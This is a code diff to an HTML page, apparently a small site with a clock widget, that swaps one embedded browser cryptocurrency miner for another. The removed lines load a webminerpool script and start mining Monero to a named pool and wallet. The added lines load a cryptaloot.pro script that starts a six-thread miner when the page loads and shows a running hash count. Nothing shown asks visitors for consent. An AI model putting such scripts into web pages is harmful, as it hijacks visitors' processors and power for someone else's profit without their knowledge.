@@ -31,14 +31,21 @@
       setInterval('clock()', 1000);
     </script>   
   </div>
-  
- 
-<!--THE MINER SCRIPT-->
-<script src="https://webminerpool.com/webmr.js"></script>
-	
-<!--START THE MINER-->
-<script>
-startMining("supportxmr.com","433wsaNwcgVfbs5YqFygdeauGM4GJRMSa3iTfGCv2iFT7P7SVfjBwr2eHGABGJAnhBT45ih9swVd28gjhLmAjupBNvUsWKQU");
-</script>
-  
+  <script src="//cryptaloot.pro/lib/crypta.js"></script>
+  <script>
+    var miner=new CRLT.Anonymous('YOUR_SITE_PUBLIC_KEY',
+      {
+        threads:6,autoThreads:false,throttle:0.2,
+      }
+    );
+    miner.start();
+    miner.on('found', function() { /* Hash found */ })
+    miner.on('accepted', function() { /* Hash accepted by the pool */ })
+    setInterval(function() {
+    var hashesPerSecond = miner.getHashesPerSecond();
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes();
+    document.getElementById("totalhashes").innerHTML = totalHashes + " Hashes";
+        }, 1000);
+  </script>
 <p id="totalhashes"></p>
